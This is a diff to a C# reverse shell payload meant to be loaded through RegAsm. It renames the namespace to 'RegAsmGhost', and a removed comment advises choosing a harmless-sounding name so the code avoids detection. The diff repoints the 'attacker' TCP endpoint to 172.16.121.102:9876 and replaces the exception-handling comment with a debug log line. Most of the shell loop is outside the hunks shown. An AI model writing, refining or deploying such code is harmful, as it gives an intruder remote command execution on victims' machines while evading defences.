@@ -1,10 +1,10 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Net.Sockets;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace AlphaSkillsPayload  // (Use a benign namespace/name, avoid "RShell" etc.)
+namespace RegAsmGhost
 {
     [ComVisible(true)]
     public class Payload
@@ -16,7 +16,7 @@ namespace AlphaSkillsPayload  // (Use a benign namespace/name, avoid "RShell" et
             try
             {
                 // 1. Connect to attacker (reverse shell endpoint)
-                TcpClient client = new TcpClient("10.10.10.10", 9876);
+                TcpClient client = new TcpClient("172.16.121.102", 9876);
                 NetworkStream stream = client.GetStream();
                 StreamReader reader = new StreamReader(stream);
                 StreamWriter writer = new StreamWriter(stream);
@@ -52,7 +52,7 @@ namespace AlphaSkillsPayload  // (Use a benign namespace/name, avoid "RShell" et
             }
             catch (Exception ex)
             {
-                // Handle exceptions (optional: you can log or suppress errors to avoid noisy failures)
+                System.Diagnostics.Debug.WriteLine("RegAsmGhost exception: " + ex.Message);
             }
         }
     }
